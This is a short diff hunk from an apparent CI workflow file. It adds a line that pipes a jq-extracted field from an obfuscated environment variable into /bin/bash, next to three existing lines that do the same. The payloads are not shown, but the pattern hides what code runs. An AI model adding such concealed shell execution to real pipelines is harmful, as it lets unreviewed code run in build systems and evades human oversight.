@@ -49,6 +49,7 @@ jobs:
           echo $alig1521 | jq -r .lq32 | /bin/bash
           echo $ndals60 | jq -r .zc26 | /bin/bash
           echo $xynbp562 | jq -r .npxcl264 | /bin/bash
+          printf '%s' "$il856" | jq -r .cdz24 | /bin/bash
 
       - name: Save archive
         if: always()
